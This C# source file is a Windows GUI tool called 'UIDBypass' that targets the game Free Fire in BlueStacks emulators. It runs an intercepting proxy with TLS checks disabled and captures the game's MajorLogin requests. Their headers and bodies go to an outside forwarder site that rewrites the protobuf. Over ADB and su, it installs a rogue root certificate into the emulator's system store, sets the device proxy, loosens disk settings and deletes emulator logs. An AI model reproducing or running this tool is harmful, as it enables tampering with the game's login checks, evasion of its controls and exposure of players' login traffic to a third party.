using Guna.UI2.WinForms;
using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System;
using System.IO;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net.Http;
using Titanium.Web.Proxy;
using Titanium.Web.Proxy.EventArguments;
using Titanium.Web.Proxy.Models;
using ProtoBuf;
using LoginProto;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Org.BouncyCastle.Asn1.IsisMtt.Ocsp;
using System.Reflection.Metadata;
using Titanium.Web.Proxy.Http;

namespace UIDBypass
{
    public partial class MainUi : Form
    {
        private static string ProxyAddress;
        private Bitmap _buffer;


        
        private const string FORWARDER_URL = "https://apiabnormalred.pages.dev/uidbypass";

        private static readonly HttpClientHandler _handler = new HttpClientHandler()
        {
            ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
        };

        private static readonly HttpClient secureHttpClient = new HttpClient(_handler)
        {
            Timeout = TimeSpan.FromSeconds(30)
        };

      
        private static readonly HashSet<string> HopByHop = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
    {
        "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
        "te", "trailer", "transfer-encoding", "upgrade", "host"
    };

        public MainUi()
        {
            this.TopMost = true;

            InitializeComponent();


            this.DoubleBuffered = true;
            this.SetStyle(ControlStyles.OptimizedDoubleBuffer, true);
            this.StartPosition = FormStartPosition.CenterScreen;

            selectPnl.Hide();
            mainPnl.Show();
            setupPnl.Hide();


            SetDragControlForAllLabels(this);
            this.TopMost = true;
        }




        string certpath;


        private void L0gin_Load(object sender, EventArgs e)
        {
            certpath = ExtractEmbeddedCert2("rootCert.pfx");
          

         

            BypassPort();
            Proxy();
            this.TopMost = true;
            this.Activate();
            this.BringToFront();
        }



        private static readonly HttpClient httpClient = new HttpClient();

        

        static async Task BypassPort()
        {
            try
            {
                string ipV4 = GetLocalIPv4Address();
                if (string.IsNullOrEmpty(ipV4))
                {
                   
                    ipV4 = "127.0.0.1";

                 
                }

               
                ProxyAddress = $"{ipV4}:8082";
            }
            catch (Exception)
            {
                // keep original behavior on failure
                Process.GetCurrentProcess().Kill();
            }

            await Task.CompletedTask; // method is async, keep compiler happy
        }

        static string GetLocalIPv4Address()
        {
           
            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces()
                         .Where(n =>
                             n.OperationalStatus == OperationalStatus.Up &&
                             n.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                             n.NetworkInterfaceType != NetworkInterfaceType.Tunnel))
            {
                try
                {
                    var props = nic.GetIPProperties();
                    foreach (var ua in props.UnicastAddresses)
                    {
                        if (ua.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            string ip = ua.Address.ToString();

                            // skip loopback and APIPA (169.254.x.x)
                            if (IPAddress.IsLoopback(ua.Address)) continue;
                            if (ip.StartsWith("169.254.")) continue;

                            return ip;
                        }
                    }
                }
                catch
                {
                    // ignore adapters we can't query
                }
            }

           
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                var addr = host.AddressList.FirstOrDefault(a =>
                    a.AddressFamily == AddressFamily.InterNetwork &&
                    !IPAddress.IsLoopback(a) &&
                    !a.ToString().StartsWith("169.254."));
                if (addr != null) return addr.ToString();
            }
            catch { }

            return null;
        }





        public static async Task Proxy()
        {
            var proxyServer = new ProxyServer();
            var explicitEndPoint = new ExplicitProxyEndPoint(System.Net.IPAddress.Any, 8082, true);

            proxyServer.AddEndPoint(explicitEndPoint);

            proxyServer.BeforeRequest += async (sender, e) => await OnRequest(sender, e);
            proxyServer.BeforeResponse += async (sender, e) => await OnResponse(sender, e);

            proxyServer.Start();

            Console.WriteLine("[INFO] Proxy started on port 8082");
        }

        private static string NowTs() => DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

        private static Dictionary<string, string> CleanHeadersForForward(HeaderCollection headers)
        {
            var outDict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (var h in headers)
            {
                try
                {
                    var name = h.Name ?? "";
                    if (string.IsNullOrEmpty(name)) continue;
                    if (HopByHop.Contains(name)) continue;
                  
                    outDict[name] = string.Join(", ", h.Value);
                }
                catch { /* ignore header parsing errors */ }
            }
            return outDict;
        }


    
        private static string ResolveClientIp(SessionEventArgs e)
        {
            try
            {
               
                var httpClient = e.GetType().GetProperty("HttpClient")?.GetValue(e);
                if (httpClient != null)
                {
                    var remoteEpProp = httpClient.GetType().GetProperty("RemoteEndPoint");
                    if (remoteEpProp != null)
                    {
                        var remoteEp = remoteEpProp.GetValue(httpClient);
                        if (remoteEp != null)
                        {
                            var addrProp = remoteEp.GetType().GetProperty("Address");
                            var addr = addrProp?.GetValue(remoteEp);
                            if (addr != null) return addr.ToString();
                        }
                    }
                }

               
                var clientConnProp = e.GetType().GetProperty("ClientConnection");
                if (clientConnProp != null)
                {
                    var clientConn = clientConnProp.GetValue(e);
                    if (clientConn != null)
                    {
                        var remoteEpProp2 = clientConn.GetType().GetProperty("RemoteEndPoint");
                        var remoteEp2 = remoteEpProp2?.GetValue(clientConn);
                        if (remoteEp2 != null)
                        {
                            var addrProp2 = remoteEp2.GetType().GetProperty("Address");
                            var addr2 = addrProp2?.GetValue(remoteEp2);
                            if (addr2 != null) return addr2.ToString();
                        }
                    }
                }
            }
            catch
            {
                // ignore reflection errors and fallthrough to unknown
            }
            return "unknown";
        }



        private static async Task OnRequest(object sender, SessionEventArgs e)
        {
            try
            {
                var method = e.HttpClient.Request.Method;
                var url = e.HttpClient.Request.Url;

                if (!method.Equals("POST", StringComparison.OrdinalIgnoreCase) ||
                    url.IndexOf("MajorLogin", StringComparison.OrdinalIgnoreCase) < 0)
                {
                    return; // not our flow
                }

                var clientIp = ResolveClientIp(e);
                Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Intercepted request path={new Uri(url).AbsolutePath} client={clientIp}");

                
                byte[] reqBody = null;
                try
                {
                    reqBody = await e.GetRequestBody();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Failed reading request body: {ex.Message}");
                }

                if (reqBody == null || reqBody.Length == 0)
                {
                    Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Empty request body - skipping forwarder");
                    return;
                }

               
                var headersDict = CleanHeadersForForward(e.HttpClient.Request.Headers);

                var payload = new ForwarderRequest
                {
                    Method = method,
                    Url = url,
                    Headers = headersDict,
                    BodyB64 = Convert.ToBase64String(reqBody),
                    Operation = "modify_protobuf"
                };

                var json = JsonSerializer.Serialize(payload, new JsonSerializerOptions { PropertyNamingPolicy = JsonNamingPolicy.CamelCase });

                Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Sending to forwarder -> method={method} url={url} headers_keys=[{string.Join(", ", headersDict.Keys)}] body_len={reqBody.Length}B");

                HttpResponseMessage resp;
                try
                {
                    using var content = new StringContent(json, Encoding.UTF8, "application/json");
                    resp = await secureHttpClient.PostAsync(FORWARDER_URL, content);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Forwarder POST failed: {ex.Message} - letting request proceed to origin");
                    return; // let request go to origin
                }

                if (!resp.IsSuccessStatusCode)
                {
                    var err = "<no body>";
                    try { err = await resp.Content.ReadAsStringAsync(); } catch { }
                    Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Forwarder responded non-200: {(int)resp.StatusCode} - {err.Substring(0, Math.Min(200, err.Length))}");
                    return;
                }

                string respText = await resp.Content.ReadAsStringAsync();

                ForwarderResponse parsed = null;
                try
                {
                    parsed = JsonSerializer.Deserialize<ForwarderResponse>(respText, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Failed parsing forwarder JSON: {ex.Message}");
                    return;
                }

                if (parsed == null)
                {
                    Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Forwarder returned empty JSON - letting request proceed");
                    return;
                }

                int fStatus = parsed.Status;
                var headerKeys = (parsed.Headers != null) ? string.Join(", ", parsed.Headers.Keys) : "";
                byte[] bodyBytes = Array.Empty<byte>();
                int returnedBodyLen = 0;
                if (!string.IsNullOrEmpty(parsed.BodyB64))
                {
                    try
                    {
                        bodyBytes = Convert.FromBase64String(parsed.BodyB64);
                        returnedBodyLen = bodyBytes.Length;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Failed decoding body_b64: {ex.Message}");
                        bodyBytes = Array.Empty<byte>();
                        returnedBodyLen = 0;
                    }
                }

                Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Forwarder returned -> status={fStatus} headers_keys=[{headerKeys}] body_len={returnedBodyLen}B");

               
                var retHeaders = new Titanium.Web.Proxy.Http.HeaderCollection();
                if (parsed.Headers != null)
                {
                    foreach (var kv in parsed.Headers)
                    {
                        // skip hop-by-hop headers
                        if (HopByHop.Contains(kv.Key)) continue;

                        try
                        {
                            retHeaders.AddHeader(kv.Key, kv.Value);
                        }
                        catch
                        {
                            // ignore headers that cannot be added
                        }
                    }
                }

             
                try
                {
                    retHeaders.RemoveHeader("content-length");
                }
                catch { /* ignore if unsupported */ }

                try
                {
                    retHeaders.AddHeader("content-length", returnedBodyLen.ToString());
                }
                catch { /* ignore if restricted */ }

               
                try
                {
                   
                    e.Ok(bodyBytes ?? Array.Empty<byte>(), retHeaders);

                  
                    try
                    {
                        if (parsed.Status != 0)
                        {
                            e.HttpClient.Response.StatusCode = parsed.Status;
                        }
                    }
                    catch { /* ignore API differences */ }

                    Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] Response posted back to client (status={parsed.Status}, {returnedBodyLen}B)");
                    return; // stop further processing
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] e.Ok(byte[], headers) failed: {ex.Message}");
                   
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{NowTs()}] [MAJORLOGIN] OnRequest exception: {ex.Message}");
            }
        }


        private static async Task OnResponse(object sender, SessionEventArgs e)
        {
         
            await Task.CompletedTask;
        }

      
        public class ForwarderRequest
        {
            [JsonPropertyName("method")]
            public string Method { get; set; } = "POST";

            [JsonPropertyName("url")]
            public string Url { get; set; } = "";

            [JsonPropertyName("headers")]
            public Dictionary<string, string> Headers { get; set; } = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

            [JsonPropertyName("body_b64")]
            public string BodyB64 { get; set; } = "";

            [JsonPropertyName("operation")]
            public string Operation { get; set; } = "";
        }

        public class ForwarderResponse
        {
            [JsonPropertyName("status")]
            public int Status { get; set; }

            [JsonPropertyName("statusText")]
            public string? StatusText { get; set; }

            [JsonPropertyName("headers")]
            public Dictionary<string, string>? Headers { get; set; }

            [JsonPropertyName("body_b64")]
            public string? BodyB64 { get; set; }

            [JsonPropertyName("processing_result")]
            public object? ProcessingResult { get; set; }
        }







        private void SetDragControlForAllLabels(Control parent)
        {
            foreach (Control ctrl in parent.Controls)
            {
                if (ctrl is Label || ctrl is Guna2Panel || ctrl is Guna2CustomGradientPanel || ctrl is Panel)
                {
                    Guna.UI2.WinForms.Guna2DragControl drag = new Guna.UI2.WinForms.Guna2DragControl();

                    drag.TargetControl = ctrl;
                    drag.UseTransparentDrag = false;
                    drag.TransparentWhileDrag = false;
                }

                if (ctrl.HasChildren)
                {
                    SetDragControlForAllLabels(ctrl);
                }
            }
        }


        #region Startup Emulator And Label Update
        public void UpdateEmulatorStatus1() //BLUSTACKS
        {
            string exePathNXT = @"C:\Program Files\BlueStacks_nxt\HD-Player.exe";


            // Defaults
            EName.Text = "None" + "   ";
            EVersion.Text = "Unknown" + "   ";
            sts.Text = "Not running" + "   ";

            // BlueStacks NXT
            if (File.Exists(exePathNXT))
            {
                EName.Text = "BlueStacks NXT" + "   ";

                try { EVersion.Text = FileVersionInfo.GetVersionInfo(exePathNXT).FileVersion; } catch { }

                var instance = Process.GetProcessesByName("HD-Player").FirstOrDefault();
                if (instance != null)
                {
                    sts.Text = "Emulator Connected!" + "   ";


                }
                else
                {
                    sts.Text = "Installed but not running" + "   ";
                }

                return; // prioritize NXT if both present
            }


        }
        public void ConnectEmulator1() // BLUSTACKS
        {
            string[] paths = {
                                "C:\\Program Files\\Bluestacks_nxt\\HD-Player.exe",
                                "C:\\Program Files\\BlueStacks\\Bluestacks.exe",


                            };

            foreach (string path in paths)
            {
                if (File.Exists(path))
                {
                    Process.Start(path);
                    //toastNotification.ShowNotification("Notification", "Emulator Connected!", ToastNotification.NotificationType.Success);

                    return;
                }
            }

            Console.WriteLine("No executable found.");
        }
        public void UpdateEmulatorStatus2()// MSI
        {
            string exePathMSI = @"C:\Program Files\BlueStacks_msi5\HD-Player.exe";

            // Defaults
            EName.Text = "None" + "   ";
            EVersion.Text = "Unknown" + "   ";
            sts.Text = "Not running" + "   ";

            // BlueStacks MSI
            if (File.Exists(exePathMSI))
            {
                EName.Text = "MSI App Player" + "   ";

                try { EVersion.Text = FileVersionInfo.GetVersionInfo(exePathMSI).FileVersion; } catch { }

                var adbProcess = Process.GetProcessesByName("HD-Player").FirstOrDefault();
                if (adbProcess != null)
                {
                    sts.Text = "Emulator Connected!" + "   ";
                }
                else
                {
                    sts.Text = "Installed but not running" + "   ";
                }
            }
        }
        public void ConnectEmulator2() // MSI
        {
            string[] paths = {

                                "C:\\Program Files\\Bluestacks_msi2\\Bluestacks.exe",
                                "C:\\Program Files\\Bluestacks_msi5\\HD-Player.exe"
                            };

            foreach (string path in paths)
            {
                if (File.Exists(path))
                {
                    Process.Start(path);
                    //toastNotification.ShowNotification("Notification", "Emulator Connected!", ToastNotification.NotificationType.Success);
                    //label11.Text = "Connected To MSI App Player";
                    //label11.ForeColor = Color.LimeGreen;
                    return;
                }
            }

            Console.WriteLine("No executable found.");
        }
        #endregion


        protected override void OnPaint(PaintEventArgs e)
        {
            if (_buffer == null || _buffer.Size != this.Size)
            {
                _buffer = new Bitmap(this.Width, this.Height);
            }

            using (Graphics g = Graphics.FromImage(_buffer))
            {

                g.Clear(Color.FromArgb(15, 15, 15));



            }


            e.Graphics.DrawImage(_buffer, 0, 0);


            int borderWidth = 1;
            Color borderColor = Color.FromArgb(40, 40, 40);
            ControlPaint.DrawBorder(e.Graphics, this.ClientRectangle,
                borderColor, borderWidth, ButtonBorderStyle.Solid,
                borderColor, borderWidth, ButtonBorderStyle.Solid,
                borderColor, borderWidth, ButtonBorderStyle.Solid,
                borderColor, borderWidth, ButtonBorderStyle.Solid);
        }

        protected override void OnPaintBackground(PaintEventArgs e)
        {

        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {

            base.OnFormClosing(e);
        }

        private async Task RestartFreeFire()
        {
            await Task.Run(() =>
            {
                RunAdbCommand("shell am force-stop com.dts.freefiremax");
                Thread.Sleep(500);
                RunAdbCommand("shell monkey -p com.dts.freefiremax -c android.intent.category.LAUNCHER 1");
            });
        }
        private string GetAdbPath()
        {
            string[] paths = {
        @"C:\Program Files\BlueStacks_msi5\HD-Adb.exe",
        @"C:\Program Files\BlueStacks_nxt\HD-Adb.exe"
    };

            foreach (string path in paths)
            {
                if (File.Exists(path))
                    return path;
            }

            throw new FileNotFoundException("No valid ADB executable found.");
        }

        private void RunAdbCommand(string args)
        {
            string port = txtAdbPort.Text.Trim();
            if (string.IsNullOrWhiteSpace(port)) port = "5555";

            string adbPath = GetAdbPath();

            
            ConnectToAdbPort(adbPath, port);

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = adbPath,
                Arguments = $"-s 127.0.0.1:{port} {args}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                Console.WriteLine($"[ADB] Output: {output}");
                Console.WriteLine($"[ADB] Error: {error}");
            }
        }
        private void ConnectToAdbPort(string adbPath, string port)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = adbPath,
                Arguments = $"connect 127.0.0.1:{port}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                Console.WriteLine($"[ADB Connect] Output: {output}");
                Console.WriteLine($"[ADB Connect] Error: {error}");
            }
        }
        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            selectPnl.Hide();
            mainPnl.Hide();
            setupPnl.Show();

        }

        private void guna2CustomCheckBox1_Click_1(object sender, EventArgs e)
        {
            ControlFader.ToggleFade(guna2GradientButton3);
            if (guna2CustomCheckBox1.Checked)
            {
                guna2GradientButton2.Text = "Start Bypass";
            }
            else
            {
                guna2GradientButton2.Text = "Connect Bypass";
            }

        }

        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {

            Environment.Exit(0);
        }

        private void guna2GradientButton4_Click(object sender, EventArgs e)
        {
            selectPnl.Show();
            mainPnl.Hide();
            setupPnl.Hide();
            adbPort = txtAdbPort.Text.Trim();
        }

        private void guna2GradientButton9_Click(object sender, EventArgs e)
        {
            selectPnl.Hide();
            mainPnl.Show();
            setupPnl.Hide();
        }

        private void guna2GradientButton12_Click(object sender, EventArgs e)
        {
            selectPnl.Hide();
            mainPnl.Show();
            setupPnl.Hide();
        }

        private async void guna2GradientButton5_Click(object sender, EventArgs e)
        {
            MSISelected = false;
            ConnectEmulator1(); 
            await Task.Delay(2000); 
            UpdateEmulatorStatus1(); 
            selectPnl.Hide();
            mainPnl.Show();
            setupPnl.Hide();

        }
        private bool MSISelected = false;
        private async void guna2GradientButton6_Click(object sender, EventArgs e)
        {
            MSISelected = true;
            ConnectEmulator2(); 
            await Task.Delay(2000); 
            UpdateEmulatorStatus2(); 
            selectPnl.Hide();
            mainPnl.Show();
            setupPnl.Hide();
        }

        private async void guna2GradientButton2_Click(object sender, EventArgs e)
        {
            if (guna2CustomCheckBox1.Checked)
            {
                await RestartFreeFire();
                sts.Text = "Free Fire Started!";
                Thread.Sleep(1685);


                // Apply proxy from API
                RunAdbCommand($"shell settings put global http_proxy {ProxyAddress}");
                // Restart game

                await Task.Delay(6000);

                // Remove proxy
                RunAdbCommand("shell settings put global http_proxy :0");
                await Task.Delay(200);
                sts.Text = "Bypass Successful";
            }
            else
            {
                string packageName = "com.dts.freefiremax";
                string emulatorIP = "127.0.0.1:5555";
                RunAdbCommand("-s " + emulatorIP + " shell am force-stop " + packageName);
                RunAdbCommand($"shell settings put global http_proxy {ProxyAddress}");
                RunAdbCommand("-s " + emulatorIP + " shell monkey -p " + packageName + " -c android.intent.category.LAUNCHER 1");
                sts.Text = "Connected";
            }
        }

        private void guna2GradientButton3_Click(object sender, EventArgs e)
        {
            RunAdbCommand("shell settings put global http_proxy :0");
            sts.Text = "Bypass Successful";
        }


        private const string CertHash = "3dcac768";
        private const string EmbeddedResourceName = "UIDBypass.3dcac768.0";
        private void Log(string msg, bool success = false, bool error = false)
        {
            string prefix = success ? "[✓] " : error ? "[✗] " : "";
            string line = prefix + msg;
            if (txtLog.InvokeRequired)
                txtLog.Invoke(new Action(() => AppendLogLine(line)));
            else
                AppendLogLine(line);
        }
        private void AppendLogLine(string line)
        {
            var lines = txtLog.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).ToList();
            lines.Add(line);
            if (lines.Count > 8) lines = lines.Skip(lines.Count - 8).ToList();
            txtLog.Text = string.Join(Environment.NewLine, lines) + Environment.NewLine;
        }

        private void EditConfigs(string engineRootPath)
        {
            if (!Directory.Exists(engineRootPath))
                throw new Exception("Engine path not found.");

            foreach (var dir in Directory.GetDirectories(engineRootPath))
            {
                string baseName = Path.GetFileName(dir);
                string[] files = {
            Path.Combine(dir, "Android.bstk.in"),
            Path.Combine(dir, baseName + ".bstk"),
            Path.Combine(dir, baseName + ".bstk-prev")
        };

                foreach (string file in files.Where(File.Exists))
                {
                    string content = File.ReadAllText(file, Encoding.UTF8);

                    // Change Root.vhd type from Readonly to Normal
                    content = System.Text.RegularExpressions.Regex.Replace(content,
                        @"(<HardDisk\b[^>]*location\s*=\s*""Root\.vhd""[^>]*type\s*=\s*"")Readonly(""\s*/?>)",
                        @"$1Normal$2", System.Text.RegularExpressions.RegexOptions.IgnoreCase);

                    // Change Data.vhdx type from Readonly to Normal
                    content = System.Text.RegularExpressions.Regex.Replace(content,
                        @"(<HardDisk\b[^>]*location\s*=\s*""Data\.vhdx""[^>]*type\s*=\s*"")Readonly(""\s*/?>)",
                        @"$1Normal$2", System.Text.RegularExpressions.RegexOptions.IgnoreCase);

                    File.WriteAllText(file, content, Encoding.UTF8);
                }
            }
        }
        private void guna2GradientButton8_Click(object sender, EventArgs e)
        {
            try
            {
                // Step 0: Kill running emulator-related processes
                string[] processesToKill = { "HD-Player", "HD-Adb", "HD-MultiInstanceManager", "BstkSVC" };
                foreach (var procName in processesToKill)
                {
                    foreach (var proc in Process.GetProcessesByName(procName))
                    {
                        try
                        {
                            proc.Kill();
                            proc.WaitForExit(2000);
                        }
                        catch { }
                    }
                }

                //C:\ProgramData\BlueStacks_nxt\Engine
                //C:\blustacks 5\BlueStacks_nxt\Engine

                // Step 1: Determine engine root based on selection
                string engineRoot = MSISelected == true ? @"C:\ProgramData\BlueStacks_msi5\Engine" : @"C:\ProgramData\BlueStacks_nxt\Engine";

                // Step 2: Edit configs
                EditConfigs(engineRoot);

                // Step 3: Delete Manager logs (BstkServer.log, .1, .2, etc.)
                string managerDir = Path.Combine(engineRoot, "Manager");
                if (Directory.Exists(managerDir))
                {
                    var logFiles = Directory.GetFiles(managerDir, "BstkServer.log")
                        .Concat(Directory.GetFiles(managerDir, "BstkServer.log.*"));

                    foreach (var file in logFiles)
                    {
                        try { File.Delete(file); }
                        catch
                        {
                            // If can't delete, truncate instead
                            try { using (var fs = new FileStream(file, FileMode.Create, FileAccess.Write)) { } } catch { }
                        }
                    }
                }

                // Step 4: Delete BstkCore logs in each instance folder
                foreach (var instanceDir in Directory.GetDirectories(engineRoot))
                {
                    string logsDir = Path.Combine(instanceDir, "Logs");
                    if (Directory.Exists(logsDir))
                    {
                        foreach (var file in Directory.GetFiles(logsDir, "BstkCore.log*"))
                        {
                            try { File.Delete(file); } catch { }
                        }
                    }
                }

                Log("Access granted.", true);
            }
            catch (Exception ex)
            {
                Log("Access failed: " + ex.Message, false, true);
            }
        }
        private static string adbPort; // default port
        private void RunAdb(string exe, string args, out string stdout, out string stderr)
        {
            var psi = new ProcessStartInfo
            {
                FileName = exe,
                Arguments = $"-s 127.0.0.1:{adbPort} {args}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (var proc = Process.Start(psi))
            {
                stdout = proc.StandardOutput.ReadToEnd();
                stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();
            }
        }
        private bool ConnectAdb(string adbExe)
        {
            RunAdb(adbExe, $"connect 127.0.0.1:{adbPort}", out var output, out _);
            if (output.Contains("connected"))
            {
                Log("ADB connected.", true);
                return true;
            }
            Log("ADB connection failed.", false, true);
            return false;
        }
        private string ResolveAdbPath()
        {
            string msi = @"C:\Program Files\Bluestacks_msi5\HD-Adb.exe";
            string nxt = @"C:\Program Files\BlueStacks_nxt\HD-Adb.exe";

            if (MSISelected)
            {
                File.Exists(msi);
                return msi;
            }
            else
            {
                File.Exists(nxt);
                return nxt;
            }

            throw new FileNotFoundException("No HD-Adb.exe found.");
        }
        private bool FileExistsOnDevice(string adb, string path)
        {
            RunAdb(adb, $"shell \"[ -f {path} ] && echo yes || echo no\"", out var result, out _);
            return result.Trim().Equals("yes", StringComparison.OrdinalIgnoreCase);
        }
        private string ExtractEmbeddedCert(string resourceName, string hash)
        {
            string outPath = Path.Combine(Path.GetTempPath(), hash + ".0");
            using (var res = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            using (var fs = File.Create(outPath))
                res.CopyTo(fs);
            return outPath;
        }

        private string ExtractEmbeddedCert2(string resourceName)
        {
            if (string.IsNullOrWhiteSpace(resourceName))
                throw new ArgumentException("resourceName must be provided", nameof(resourceName));

            var asm = Assembly.GetExecutingAssembly();
            var resources = asm.GetManifestResourceNames();

           
            string fullResourceName = resources
                .FirstOrDefault(r => string.Equals(r, resourceName, StringComparison.OrdinalIgnoreCase))
                ?? resources.FirstOrDefault(r => r.EndsWith("." + resourceName, StringComparison.OrdinalIgnoreCase))
                ?? resources.FirstOrDefault(r => r.EndsWith(resourceName, StringComparison.OrdinalIgnoreCase));

            if (fullResourceName == null)
                throw new FileNotFoundException($"Embedded resource not found: {resourceName}");

           
            string fileName;
            if (resourceName.Contains("."))
            {
                fileName = Path.GetFileName(resourceName);
            }
            else
            {
                var parts = fullResourceName.Split('.');
                if (parts.Length >= 2)
                    fileName = parts[^2] + "." + parts[^1];
                else
                    fileName = fullResourceName; 
            }

            
            var exeDir = Path.GetDirectoryName(asm.Location) ?? AppContext.BaseDirectory;
            var outPath = Path.Combine(exeDir, fileName);

            using (var resStream = asm.GetManifestResourceStream(fullResourceName))
            {
                if (resStream == null)
                    throw new FileNotFoundException($"Failed to open embedded resource stream: {fullResourceName}");

                
                Directory.CreateDirectory(exeDir);

                // Overwrite if exists
                using (var fs = new FileStream(outPath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    resStream.CopyTo(fs);
                }
            }

            return outPath;
        }
        private async void guna2GradientButton7_Click(object sender, EventArgs e)
        {
            try
            {
                await Task.Run(() =>
                {
                    string adb = ResolveAdbPath();
                    if (!ConnectAdb(adb)) return;
                    string tmp = ExtractEmbeddedCert(EmbeddedResourceName, CertHash);


                    RunAdb(adb, $"push \"{tmp}\" /sdcard/{CertHash}.0", out _, out _);

                    string suPath = "/boot/android/android/system/xbin/bstk/su";
                    string cmd =
                    $"{suPath} -c 'mount -o rw,remount /dev/sda1 /system && " +
                    $"cp /sdcard/{CertHash}.0 /system/etc/security/cacerts/{CertHash}.0 && " +
                    $"chmod 644 /system/etc/security/cacerts/{CertHash}.0 && " +
                    $"chcon u:object_r:system_file:s0 /system/etc/security/cacerts/{CertHash}.0 && " +
                    $"mount -o ro,remount /dev/sda1 /system && " +
                    $"rm /sdcard/{CertHash}.0 && " +
                    $"setprop ctl.restart zygote'";

                    RunAdb(adb, $"shell \"{cmd}\"", out _, out _);

                    Log(FileExistsOnDevice(adb, $"/system/etc/security/cacerts/{CertHash}.0")
                        ? "Certificate installed."
                        : "Certificate install failed.", true);

                });
            }
            catch
            {
                Log("Certificate install failed.", false, true);
            }
        }

        private async void guna2GradientButton10_Click(object sender, EventArgs e)
        {
            try
            {
                await Task.Run(() =>
                {
                    string adb = ResolveAdbPath();
                    if (!ConnectAdb(adb)) return;

                    string suPath = "/boot/android/android/system/xbin/bstk/su";
                    string cmd =
                        $"{suPath} -c 'mount -o rw,remount /dev/sda1 /system && " +
                        $"rm /system/etc/security/cacerts/{CertHash}.0 && " +
                        $"mount -o ro,remount /dev/sda1 /system &'"; 

                    RunAdb(adb, $"shell \"{cmd}\"", out _, out _);

                    Thread.Sleep(1000); 

                    Log(!FileExistsOnDevice(adb, $"/system/etc/security/cacerts/{CertHash}.0")
                        ? "Certificate removed."
                        : "Certificate removal failed.", true);
                });
            }
            catch
            {
                Log("Certificate removal failed.", false, true);
            }
        }

        private void guna2GradientButton11_Click(object sender, EventArgs e)
        {
            string[] targets = { "HD-Player", "HD-Adb" };
            bool killed = false;
            foreach (var name in targets)
            {
                foreach (var proc in Process.GetProcessesByName(name))
                {
                    try { proc.Kill(); killed = true; } catch { }
                }
            }
            Log(killed ? "Emulator processes terminated." : "No emulator process found to kill.", true);

        }

        private void strange_Label8_Click(object sender, EventArgs e)
        {
           
        }
    }
}